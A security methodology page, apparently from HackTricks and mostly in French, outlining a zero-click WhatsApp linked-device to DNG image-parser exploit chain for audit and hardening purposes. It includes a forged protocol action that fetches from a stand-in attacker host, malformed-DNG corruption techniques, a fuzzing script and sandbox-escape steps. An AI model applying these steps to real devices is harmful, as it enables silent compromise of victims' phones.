# Zero-click Messaging → Image Parser Chains

{{#include ../../banners/hacktricks-training.md}}

## TL;DR

- Traitez **protocoles multi-appareils / appareil compagnon des applications de messagerie** comme des canaux de télécommande : si des champs de protocole sont supposés provenir d'appareils de confiance, ils peuvent néanmoins être contrôlés par l'utilisateur et peuvent souvent être rejoués directement contre une victime pour charger du contenu arbitraire avec **0 interaction utilisateur**.
- Une fois qu'une app peut être contrainte à récupérer des médias non fiables, ciblez le **shared OS media pipeline** (RawCamera on iOS/macOS, vendor parsers on Android OEM builds) avec des fichiers malformés pour pivoter hors du sandbox.
- Les bugs du parser Samsung et de RawCamera basés sur DNG discutés ici sont des exemples concrets, mais la technique complète est un plan réutilisable pour enchaîner **failles logiques → corruption mémoire du parseur d'images → compromission complète de l'appareil**.

## Remote content loading via WhatsApp linked-device commands

### Attack surface recap

L'architecture "linked devices" de WhatsApp maintient le téléphone principal et chaque appareil compagnon (desktop, tablet, secondary phone) synchronisés via des messages de protocole structurés et chiffrés. Chaque message encode :

- **Device metadata** (device ID, capabilities, feature flags).
- **Action descriptors** (e.g., sync chats, fetch thumbnails, render remote content).
- **Arbitrary parameters** such as URIs, MIME hints, pagination keys, etc.

Sur les clients Apple, le gestionnaire qui traite ces paquets de contrôle linked-device **implémentait une confiance implicite** qu'un appairage valide avait déjà eu lieu, si bien que les champs à fort impact (p.ex., `resource_url`, `open_media`, `sync_snapshot`) n'étaient que très peu validés. Un message companion malveillant pouvait donc :

1. Être acheminé vers n'importe quel compte identifié par son numéro de téléphone.
2. Traverser la pile de transport (Noise protocol + WhatsApp protobuf framing) car le récepteur ne vérifiait jamais que l'expéditeur était un appareil légitimement appairé.
3. Atteindre le client iOS, où le chemin de code vulnérable déclenchait automatiquement une requête HTTP(S) en arrière-plan vers l'URL de l'attaquant et analysait la réponse dans un WebView/media renderer caché.

### Practical workflow for auditors

1. **Capture legitimate linked-device traffic.** Attachez un débogueur ou un script Frida au client desktop/iOS et interceptez le gestionnaire post-decrypt (p.ex., `LinkedDevicesSyncHandler::processAction`). Exportez les payloads protobuf décodés pour identifier les types d'action et les paramètres disponibles.
2. **Identify fields that cross trust boundaries.** Toute action contenant `http_url`, `thumbnail_uri`, `download_url`, ou `render_html` sans listes blanches strictes est un candidat comme primitive de contenu distant.
3. **Forge a malicious action.** Réutilisez le schéma protobuf observé et ne modifiez que les champs contrôlés par l'attaquant. Une vue JSON simplifiée de la structure logique pertinente est montrée ci-dessous (le transport réel est protobuf/Noise, mais les champs sémantiques correspondent) :
```json
{
"op": "sync_action",
"device_id": "<attacker-companion>",
"payload": {
"target": "content_sync",
"resource_url": "https://evil.example/payload.html",
"media_type": "image/dng",
"flags": ["background_fetch", "render_inline"]
}
}
```
4. **Livrer à la victime.** Réinjecter le paquet forgé via le même service WhatsApp qui relaie normalement le trafic des appareils liés (par ex., en utilisant un client desktop modifié ou un client Noise personnalisé réutilisant les clés du compte de l'attaquant). Étant donné que CVE-2025-55177 ne liait pas les actions aux appareils authentifiés, le client iOS/macOS de la victime acceptait le message et récupérait immédiatement l'URL de l'attaquant sans aucune interface utilisateur.
5. **Instrumenter la récupération.** Observer la requête HTTP(S) forcée et le renderer interne (WKWebView/ImageIO). À ce stade, vous possédez une primitive de livraison web zero-click à l'intérieur de WhatsApp.

## Exploiter les DNG auto-décodés contre RawCamera

Une fois que l'attaquant contrôle ce que WhatsApp charge, l'objectif suivant est de faire en sorte qu'iOS/macOS analyse un fichier **Digital Negative (DNG)** malveillant avec le framework **RawCamera**. Tout `<img>`/URL CSS intégrée qui résout en `.dng` sera transmis au pipeline d'images système, invoquant RawCamera même si WhatsApp lui-même n'a jamais géré explicitement les DNGs.

### Déclencher RawCamera depuis WhatsApp

- Servir du HTML qui référence le DNG via plusieurs mécanismes (par ex., `<img src="evil.dng">`, CSS `background-image: url('evil.dng')`, ou sources `<picture>`) pour couvrir différents chemins de rendu.
- S'assurer du MIME correct (`image/x-adobe-dng`) et de petites vignettes afin que le chargeur ne renonce pas prématurément à cause des heuristiques de taille.
- Le sandbox média iOS diffusera le fichier vers RawCamera via `CGImageSourceCreateWithURL`, atteignant finalement le décodeur vulnérable.

### Création de DNGs corrompant la mémoire (type CVE-2025-43300)

Le bug reproduit reposait sur des métadonnées incohérentes qui désynchronisaient l'allocation de tampon par rapport aux lectures réelles de pixels. Les leviers typiques incluent :

- **Tile/strip descriptors**: Définir `TileByteCounts`/`StripByteCounts` avec des valeurs réalistes mais augmenter `TileOffsets` pour pointer au-delà du tampon alloué.
- **Sub-IFD chains**: Intégrer des images secondaires avec des `ImageWidth`/`ImageLength` et `BitsPerSample` contradictoires de sorte que RawCamera calcule un petit tampon alors que les étapes ultérieures font confiance à des dimensions contrôlées par l'attaquant.
- **Opcode metadata**: Manipuler les entrées `OpcodeList3` afin que le traitement par ligne opère sur des index choisis par l'attaquant.

Un outil de mutation basique pour rechercher ce type de corruptions peut être construit autour de macOS, puisque le même code RawCamera est embarqué sur macOS/iOS/iPadOS :
```bash
#!/bin/bash
set -e
for sample in corpus/*.dng; do
radamsa "$sample" > /tmp/poc.dng
/System/Library/CoreServices/RawCamera.bundle/Contents/MacOS/RawCamera /tmp/poc.dng >/tmp/out 2>&1 || {
mv /tmp/poc.dng crashes/$(date +%s).dng
}
done
```
Chaque crash dans `RawCamera` vous procure une nouvelle primitive. Le PoC publié a obtenu un out-of-bounds read/write suffisamment fiable pour planter WhatsApp sur iPhone, iPad et Mac.

## Construction de la chaîne 0-click

1. **Linked-device packet** → contraint WhatsApp à récupérer `https://evil.example/payload.html` sans aucune interaction.
2. **Payload HTML** → fait référence silencieusement à `evil.dng`, garantissant que RawCamera est invoqué par la media stack de l'OS.
3. **Malicious DNG** → exploite des tags conçus pour déclencher l'OOB de RawCamera et crash/own le décodeur d'images.
4. **Post-corruption exploitation** → ajouter des gadgets info-leak (p.ex., en abusant des métadonnées heap prévisibles) et préparer une chaîne ROP/JOP pour sortir du sandbox WhatsApp et accéder à des contextes plus privilégiés.

Parce que chaque étape est automatique, l'attaquant n'a besoin que du numéro de téléphone de la victime. Aucune notification, bannière ou invite n'est affichée sur l'appareil cible.

## Samsung vendor image parser parallels

Le bulletin de Samsung pour CVE-2025-21043 a confirmé que leur pile propriétaire d'analyse d'images (utilisée par Gallery, Messages, et aussi indirectement par WhatsApp) a souffert d'un **out-of-bounds write** exploitable via des médias non fiables. La méthodologie d'exploitation reflète la chaîne Apple :

- Identifier un vecteur d'aperçu automatique (miniatures de chat, aperçus de notification, share sheets) qui analyse le fichier de l'attaquant avec les bibliothèques Samsung `libimagecodec`/`libOneUI_ImageDecoder`.
- Différencier les mises à jour des bibliothèques OEM ou effectuer du fuzzing des parseurs avec des fichiers RAW/DNG malformés jusqu'à observer des corruptions mémoire similaires au crash de RawCamera (écrasement des métadonnées heap, contrôle des registres, etc.).
- Livrer le fichier conçu via n'importe quel canal qui charge déjà automatiquement le contenu (p.ex., le même linked-device primitive, les fetchers de preview WhatsApp, ou les aperçus de waveform push-to-talk d'Android).

Une fois qu'un OOB write est présent dans le parser du vendor, le combiner avec le WhatsApp auto-fetch primitive donne lieu à une autre zero-click chain sur les appareils Samsung.

## Liste de contrôle pour tests et durcissement

- **Protocol validation** : Imposer des allow-lists strictes pour chaque action linked-device. Les commandes compagnon qui demandent un fetch/render doivent prouver le device pairing (signature du payload) et l'URL doit correspondre à une allow-list ou à un blob signé.
- **Transport replay countermeasures** : Lier chaque action à une clé par appareil et rejeter les paquets dont la clé d'émetteur est inconnue, même si la syntaxe protobuf est correcte.
- **Media pipeline restrictions** : Les applications high-level ne doivent autoriser que des MIME types approuvés et rejeter explicitement RAW/DNG sauf si la fonctionnalité est nécessaire.
- **Parser fuzzing regression tests** : Conserver un corpus de fichiers RAW/DNG malformés et les exécuter contre les décodeurs RawCamera/vendor après chaque mise à jour.
- **Crash triage automation** : Attacher des sanitizers via `DYLD_INSERT_LIBRARIES` ou MTE sur les appareils de fuzz pour détecter les conditions OOB subtiles avant que les attaquants ne le fassent.

## References

- [DNGerousLINK: A Deep Dive into WhatsApp 0-Click Exploits on iOS and Samsung Devices](https://media.ccc.de/v/39c3-dngerouslink-a-deep-dive-into-whatsapp-0-click-exploits-on-ios-and-samsung-devices)

{{#include ../../banners/hacktricks-training.md}}
